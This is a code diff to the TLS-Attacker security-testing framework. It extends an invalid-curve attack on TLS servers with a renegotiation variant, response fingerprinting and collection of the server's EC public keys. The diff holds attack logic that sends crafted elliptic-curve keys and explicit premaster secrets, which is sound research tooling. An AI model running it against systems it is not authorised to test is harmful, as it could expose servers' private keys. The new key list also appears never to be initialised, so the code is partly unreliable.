@@ -15,6 +15,8 @@ import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
 import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
 import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
+import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
+import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
 import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
@@ -43,6 +45,8 @@ import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
 import java.math.BigInteger;
+import java.util.LinkedList;
+import java.util.List;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.bouncycastle.util.BigIntegers;
@@ -55,6 +59,10 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     private static final Logger LOGGER = LogManager.getLogger();
 
     private BigInteger premasterSecret;
+    
+    private List<ResponseFingerprint> responseFingerprints;
+    
+    private List<Point> receivedEcPublicKeys;
 
     /**
      *
@@ -89,6 +97,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                     + getTlsConfig().getDefaultSelectedCipherSuite().name());
             return null;
         }
+        responseFingerprints = new LinkedList<>();
+        
         EllipticCurve curve;
         if(config.isCurveTwistAttack()) {
             curve = config.getTwistedCurve();
@@ -116,7 +126,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 LOGGER.debug("PMS: " + premasterSecret.toString());
             }
             try {
-                WorkflowTrace trace = executeProtocolFlow();
+                WorkflowTrace trace = executeProtocolFlow();                             
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace) && getTlsConfig().getHighestProtocolVersion() != ProtocolVersion.TLS13) {
                     LOGGER.info("Did not receive ServerHello. Check your config");
 
@@ -137,8 +147,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     private WorkflowTrace executeProtocolFlow() {
         Config tlsConfig = getTlsConfig();
-        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
-                RunningModeType.CLIENT);
+        
         
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
@@ -149,7 +158,35 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         byte[] explicitPMS = BigIntegers.asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
         
-        if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
+        WorkflowTrace trace;
+        if(config.isAttackInRenegotiation())
+        {
+            trace = prepareRenegotiationTrace(serializedPublicKey, pms, explicitPMS);
+        }
+        else
+        {
+            trace = prepareRegularTrace(serializedPublicKey, pms, explicitPMS);
+        }
+        LOGGER.info("Working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
+        
+        State state = new State(tlsConfig, trace);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+        workflowExecutor.executeWorkflow();
+        
+        responseFingerprints.add(ResponseExtractor.getFingerprint(state)); 
+        if(state.getTlsContext().getServerEcPublicKey() != null)
+        {
+            getReceivedEcPublicKeys().add(state.getTlsContext().getServerEcPublicKey()); 
+        }
+        return trace;
+    }
+    
+    private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
+    {
+       Config tlsConfig = getTlsConfig();
+       WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
+                RunningModeType.CLIENT);
+       if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
         {
             trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig)));
             trace.addTlsAction(new SendAction(new FinishedMessage(tlsConfig)));
@@ -180,11 +217,42 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             message.prepareComputations();
             message.getComputations().setPremasterSecret(pms);
         }
-        LOGGER.info("Working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
+       
+       return trace;
+    }
+    
+    private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
+    {
+        Config tlsConfig = getTlsConfig();
+        tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
+        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION,
+                RunningModeType.CLIENT);
+        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage)WorkflowTraceUtil.getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+        message.setPublicKey(serializedPublicKey);
+        message.prepareComputations();
+        message.getComputations().setPremasterSecret(pms);
         
-        State state = new State(tlsConfig, trace);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
-        workflowExecutor.executeWorkflow();
         return trace;
+    }
+
+    /**
+     * @return the responseFingerprints
+     */
+    public List<ResponseFingerprint> getResponseFingerprints() {
+        return responseFingerprints;
+    }
+
+    /**
+     * @param responseFingerprints the responseFingerprints to set
+     */
+    public void setResponseFingerprints(List<ResponseFingerprint> responseFingerprints) {
+        this.responseFingerprints = responseFingerprints;
+    }
+
+    /**
+     * @return the receivedEcPublicKeys
+     */
+    public List<Point> getReceivedEcPublicKeys() {
+        return receivedEcPublicKeys;
     }
 }
